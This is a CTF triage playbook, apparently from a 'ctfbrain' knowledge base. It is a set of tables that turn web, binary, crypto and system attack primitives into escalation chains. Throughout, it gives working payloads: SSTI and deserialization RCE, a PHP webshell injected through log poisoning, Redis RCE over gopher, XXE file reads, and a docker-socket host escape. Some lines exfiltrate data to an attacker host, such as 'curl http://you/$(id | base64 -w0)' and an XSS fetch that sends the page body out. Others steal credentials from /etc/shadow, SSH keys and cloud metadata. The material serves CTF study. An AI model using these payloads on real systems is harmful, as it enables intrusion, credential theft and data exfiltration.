---
title: "Playbook - I Have Primitive P, What Can I Turn It Into?"
category: misc
subcategory: triage
type: playbook
tags: [attack-surface-by-primitive, primitive, what-now, escalation, chaining, arbitrary-read, arbitrary-write, file-read, file-write, ssrf, xss, sqli, rce, oracle, leak, stuck, what-attack, privilege-escalation]
summary: "Conversion table: for each primitive you already have (web, pwn, crypto, system), the next primitive it buys you and the exact way to get there."
when_to_use:
  - "You have a working bug but cannot reach the flag"
  - "You need to know what a partial capability is worth"
  - "You are chaining two weak bugs into one strong one"
related: [stuck, pwn-triage, web-triage, crypto-triage]
---

## How to use this

Find the row for what you **currently have**. The "buys you" column is the next primitive; the "how" column is the concrete step. Chain rows until you reach "flag".

The terminal goals, in order of preference: **read the flag file** > **RCE** > **read arbitrary memory/files** > **authenticate as admin**.

---

## Section 1 - Web primitives

| You have | It buys you | How |
|---|---|---|
| **Arbitrary file read** | the flag, source, credentials, RCE | read the flag path from `Dockerfile`; `/proc/self/environ` (env flags), `/proc/self/cmdline`, `/proc/self/fd/N`, `/etc/passwd`, `~/.ssh/id_rsa`, `.git/config`, the app's config/secret key. `ctfbrain search linux-useful-paths` |
| **Arbitrary file read (PHP)** | source + RCE | `php://filter/convert.base64-encode/resource=index.php`; then `/var/log/nginx/access.log` poisoning, or `/proc/self/environ`, or a session file at `/tmp/sess_<PHPSESSID>` |
| **Arbitrary file write** | RCE | write a webshell into the docroot; or `~/.ssh/authorized_keys`; or `/etc/cron.d/x`; or a `.htaccess`; or overwrite a `.py`/`.php` the app imports; or `/proc/self/mem` |
| **Arbitrary file write (limited path)** | RCE | write to a template directory, a plugin directory, `/tmp` + LFI, or a config file the app reloads |
| **LFI (no write)** | RCE | log poisoning (User-Agent into access.log), `/proc/self/environ`, session file, `php://filter` chain with `iconv`, PHP filter-to-RCE, `/proc/self/fd/` uploaded-tmpfile race |
| **SSRF** | internal access, cloud creds, RCE | `http://127.0.0.1:<port>` for every internal service; `169.254.169.254/latest/meta-data/` (AWS), `metadata.google.internal` (GCP); `file:///etc/passwd`; `gopher://` to speak Redis/MySQL/SMTP; `dict://` for port scanning |
| **SSRF (GET only, no headers)** | Redis/memcached RCE | `gopher://127.0.0.1:6379/_%0d%0aSET...` to write a cron job or a webshell |
| **Blind SSRF** | internal port scan | timing differences and error differences per port; then escalate via a known service |
| **XSS (reflected)** | admin session, CSRF, RCE on the bot | requires a victim: find the "report to admin" feature; steal `document.cookie`, or fetch an admin-only page and exfiltrate the body |
| **XSS (stored, admin views it)** | full admin actions | do not steal the cookie if it is HttpOnly - perform the action from the admin's browser with `fetch(..., {credentials:'include'})` |
| **XSS in a headless-Chrome bot** | local file read / SSRF | `fetch('file:///flag')` if `--allow-file-access-from-files`; otherwise pivot to internal HTTP |
| **CSRF** | one state-changing action as the victim | change their email -> password reset -> ATO |
| **SQLi (union-capable)** | data + file read + file write + RCE | MySQL: `LOAD_FILE()`, `INTO OUTFILE` -> webshell. PostgreSQL: `COPY ... FROM PROGRAM` -> RCE, `pg_read_file`. MSSQL: `xp_cmdshell`. SQLite: `ATTACH` to write a file |
| **Blind/boolean SQLi** | the same, slowly | automate with `sqlmap` or a binary-search script; `ctfbrain search sqli` |
| **NoSQLi (`$regex`)** | credential extraction char by char | `{"password": {"$regex": "^a"}}` and iterate |
| **SSTI** | RCE | Jinja2 `{{cycler.__init__.__globals__.os.popen('id').read()}}`; Twig `{{_self.env.registerUndefinedFilterCallback("exec")}}`; Freemarker `Execute`; `ctfbrain search ssti` |
| **Prototype pollution** | RCE / XSS / auth bypass | pollute a gadget that reaches `child_process` options, a template engine's config, or an `isAdmin` check; `ctfbrain search prototype-pollution` |
| **Deserialization (any language)** | RCE | ysoserial (Java), phpggc (PHP), pickle (Python), Marshal (Ruby), BinaryFormatter (.NET) |
| **A leaked secret key (Flask/Rails/Laravel)** | full session forgery | `flask-unsign --sign --secret <k>`; Laravel `APP_KEY` -> decrypt+forge the cookie -> unserialize chain |
| **IDOR** | other users' data; sometimes admin | enumerate ids; look for an admin id (`1`, `0`, a known UUID) |
| **Open redirect** | OAuth token theft | use it as the `redirect_uri` on an OAuth flow, or to bypass an SSRF allowlist |
| **Host header injection** | password reset poisoning -> ATO | trigger a reset for the admin with your host; catch the token |
| **Race condition** | double-spend, limit bypass, TOCTOU file swap | `turbo intruder`, or 50 parallel `requests` with a barrier |
| **Rate-limit bypass** | brute force a 4-6 digit code | rotate `X-Forwarded-For`, or race all candidates in parallel |
| **JWT `alg:none` / weak secret** | any identity | `jwt-tool -T`; crack HS256 with `hashcat -m 16500` |
| **Any admin-panel access** | RCE | look for a template editor, a plugin uploader, a "run query" box, a log viewer with a path parameter |
| **Command injection (blind)** | output | `curl http://you/$(id \| base64 -w0)`, DNS exfil, or write to a web-readable path |
| **XXE** | file read + SSRF | `<!ENTITY xxe SYSTEM "file:///flag">`; blind -> out-of-band DTD; `php://filter` for non-well-formed files |

---

## Section 2 - Binary/pwn primitives

See `ctfbrain search pwn-triage` section 6 for the full table. Summary of conversions:

| You have | It buys you | How |
|---|---|---|
| **A single leak** | libc/PIE/heap/stack base | GOT entry -> libc; any `.text` pointer -> PIE base; a tcache fd -> heap base; `libc.sym["environ"]` -> stack |
| **Arbitrary read** | everything | leak libc, then the stack via `environ`, then read the canary and the return address. Often the flag is already in memory |
| **Arbitrary write (once)** | control flow | Partial RELRO: a GOT entry. Full RELRO: `__free_hook`/`__malloc_hook` (glibc<=2.33), `_IO_2_1_stdout_` FSOP (>=2.34), `__exit_funcs`, or the saved return address |
| **Arbitrary write (many)** | shell | a full ROP chain onto the stack |
| **Control of RIP only** | shell | `one_gadget` (check constraints) or a stack pivot into a larger buffer |
| **Control of RIP + RDI** | shell | `system("/bin/sh")` |
| **Control of RAX + `syscall`** | shell | SROP, or a direct `execve` |
| **A UAF read** | heap + libc leak | show a freed chunk |
| **A UAF write** | arbitrary allocation | tcache poisoning -> arbitrary write |
| **A heap overflow** | chunk overlap | corrupt the next chunk's size, then free+realloc |
| **A double free** | arbitrary allocation | tcache dup (glibc<2.29) or fastbin dup via a 7-chunk tcache fill |
| **An arbitrary `free`** | arbitrary allocation | House of Spirit with a fake chunk you control |
| **A format string (read)** | canary + PIE + libc, all at once | `%N$p` sweep |
| **A format string (write)** | arbitrary write | `fmtstr_payload` |
| **An off-by-one null byte** | chunk overlap | poison null byte |
| **An integer overflow on a size** | heap overflow | undersized malloc, full-size write |
| **Shellcode execution, seccomp'd** | the flag file | open/read/write shellcode; `ctfbrain search seccomp` |
| **A `win()` function** | the flag | `ret2win` (align with a bare `ret`) |

---

## Section 3 - Crypto primitives

| You have | It buys you | How |
|---|---|---|
| **A decryption oracle (any ciphertext)** | the plaintext | RSA: blind with `r^e`. Symmetric: usually direct |
| **A padding-validity oracle (CBC)** | full decryption + arbitrary forgery | the classic padding oracle attack; `padbuster`, or hand-roll it |
| **A parity/LSB oracle (RSA)** | full plaintext | binary search over `2^k * c`, ~`log2(n)` queries |
| **An encryption oracle (ECB, your prefix)** | the appended secret | byte-at-a-time decryption |
| **An encryption oracle (CBC, fixed IV)** | the IV / plaintext recovery | chosen-plaintext with block alignment |
| **A nonce-reuse (CTR/ChaCha)** | `p1 ^ p2` | crib dragging; if one plaintext is known, the other falls out |
| **A nonce-reuse (GCM)** | the auth key `H` -> arbitrary tag forgery | the "forbidden attack" |
| **A nonce-reuse (ECDSA/DSA)** | the private key | solve two linear equations for `k` then `d` |
| **Biased nonces (many signatures)** | the private key | hidden number problem via LLL |
| **A MAC of `secret \|\| data`** | forged MACs for extended data | length extension (`hashpump`) |
| **A timing difference on compare** | the correct MAC/token byte by byte | statistical timing attack with many samples |
| **A partial key leak** | the whole key | Coppersmith (RSA), lattice (ECC), or brute force the rest |
| **Two RSA ciphertexts, same n, coprime e** | the plaintext | common modulus |
| **Two RSA moduli sharing a factor** | both private keys | `gcd(n1, n2)` |
| **A small RSA modulus (<400 bits)** | the private key | factordb / yafu / cado-nfs |
| **A smooth group order (DLOG)** | the discrete log | Pohlig-Hellman |
| **Predictable PRNG output** | the next output / the seed | Mersenne Twister state recovery, LCG inversion, Berlekamp-Massey |
| **A hash collision** | signature/integrity bypass | UniColl/fastcoll for MD5; a chosen-prefix collision for a real forgery |
| **A key derived from a timestamp** | the key | brute force a window of seconds |
| **A signature oracle (RSA, sign anything but m)** | a signature on m | multiplicative property: `sig(m) = sig(m*r^e) * r^-1` |

---

## Section 4 - System / post-exploitation primitives

| You have | It buys you | How |
|---|---|---|
| **Code execution as a low user** | the flag or root | `sudo -l`; SUID binaries (`find / -perm -4000 2>/dev/null`); capabilities (`getcap -r / 2>/dev/null`); cron; writable `PATH` entries; `ctfbrain search linux-useful-paths` |
| **A shell with no TTY** | a usable shell | `python3 -c 'import pty;pty.spawn("/bin/bash")'`, then `Ctrl-Z; stty raw -echo; fg; export TERM=xterm` |
| **Read access to `/etc/shadow`** | passwords | `unshadow passwd shadow > h; john h --wordlist=rockyou.txt` |
| **Read access to a private key** | SSH access | `chmod 600 id_rsa; ssh -i id_rsa user@host`; if encrypted, `ssh2john` + `john` |
| **A writable cron/systemd path** | root | write a job that copies a shell as SUID |
| **Docker socket access** | host root | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| **A container shell** | the host | check `/proc/1/cgroup`, `CAP_SYS_ADMIN`, a mounted docker socket, `--privileged` |
| **Database access** | app credentials, then reuse | dump users, crack hashes, reuse passwords elsewhere |
| **A leaked `.git`** | full source + secrets | `git-dumper`, then `git log -p` |
| **Any credential** | lateral movement | try it on every other service in the challenge |

---

## Section 5 - Chaining patterns worth memorising

| Chain | Steps |
|---|---|
| LFI -> RCE | LFI -> read `/var/log/nginx/access.log` -> poison User-Agent with `<?php system($_GET[0]);?>` -> include the log |
| SSRF -> RCE | SSRF -> `gopher://127.0.0.1:6379/` -> Redis `CONFIG SET dir /var/www; SET x "<?php ..."; SAVE` |
| XSS -> ATO | stored XSS -> admin bot visits -> `fetch('/admin/flag').then(r=>r.text()).then(t=>fetch('//you/'+btoa(t)))` |
| Open redirect -> ATO | OAuth `redirect_uri` points at your domain -> capture the auth code -> exchange it |
| IDOR -> admin | IDOR on a profile endpoint -> find the admin's email -> password reset -> ATO |
| Leak -> full pwn | format string leaks canary+PIE+libc -> overflow -> ret2libc |
| UAF -> shell | UAF read leaks heap+libc -> tcache poison -> `__free_hook` = `system` -> `free("/bin/sh")` |
| Weak PRNG -> token forgery | recover the MT state from visible tokens -> predict the admin's reset token |
| Hash length extension -> auth bypass | extend `sha256(secret\|\|"user=guest")` to `...&user=admin` |
| Prototype pollution -> RCE | pollute `Object.prototype.shell` -> a later `child_process.exec` call inherits it |
| File upload -> RCE | upload `.php`/`.jsp`/`.aspx`, or a `.htaccess` that maps `.jpg` to PHP |
| Arbitrary read -> pwn | read the binary from `/proc/self/exe` -> find gadgets -> ROP |

---

## If your primitive is not listed

Ask the three questions that generate the answer:
1. **What does this let me change that the program trusts?** (a pointer, a length, a path, an identity, a comparison result)
2. **What runs after I change it?** Find the first consumer of that value.
3. **What is the shortest path from that consumer to `open("/flag")` or `execve("/bin/sh")`?**

Then `ctfbrain search stuck`.
